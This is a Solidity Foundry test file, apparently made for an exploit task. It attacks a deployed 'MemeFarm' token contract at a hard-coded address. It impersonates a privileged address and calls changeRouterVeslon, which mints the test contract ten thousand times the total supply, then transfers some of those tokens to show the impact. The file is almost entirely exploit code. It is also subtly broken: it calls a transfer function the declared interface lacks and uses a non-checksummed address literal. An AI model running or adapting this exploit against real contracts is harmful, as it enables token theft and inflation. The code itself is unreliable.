```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.7;

import "forge-std/Test.sol";

interface IMemeFarm {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function changeRouterVeslon(address newRoutrAddress) external;
    function qwidji(address a, bool b) external;
    // other functions can be omitted
}

contract ExploitTest is Test {
    // Deployed contract address (from prompt)
    address constant TARGET = 0x8fac119886dd328a84cd545881c7a484017e7ce6;
    // The privileged address that can call changeRouterVeslon (set in constructor)
    address constant PRIVILEGED = 0x3aB960dCf9359083DC126222c03bfB0d2A3C9b6b;

    IMemeFarm target;

    function setUp() public {
        target = IMemeFarm(TARGET);
        vm.label(TARGET, "MemeFarm");
        vm.label(PRIVILEGED, "PrivilegedAddress");
    }

    function testMintTokensExploit() public {
        // Record initial total supply
        uint256 totalSupply = target.totalSupply();
        // The expected minted amount: totalSupply * 10000
        uint256 expectedMint = totalSupply * 10000;

        // Impersonate the privileged address
        vm.startPrank(PRIVILEGED);
        // Call the public changeRouterVeslon function with the attacker's address
        target.changeRouterVeslon(address(this));
        vm.stopPrank();

        // Verify that the attacker's balance now equals the minted amount
        uint256 attackerBalance = target.balanceOf(address(this));
        assertEq(attackerBalance, expectedMint, "Attacker did not receive the minted tokens");

        // Optional: demonstrate that tokens can be transferred (e.g., to dead address)
        // This step is not required but shows the impact
        uint256 transferAmount = 1 ether;
        vm.prank(address(this));
        target.transfer(0x000000000000000000000000000000000000dEaD, transferAmount);
        // After transfer, attacker balance decreased
        uint256 balanceAfterTransfer = target.balanceOf(address(this));
        assertEq(balanceAfterTransfer, expectedMint - transferAmount, "Transfer should reduce balance");

        // Also check dead address received
        uint256 deadBalance = target.balanceOf(0x000000000000000000000000000000000000dEaD);
        assertEq(deadBalance, transferAmount, "Dead address should have received tokens");
    }
}
```
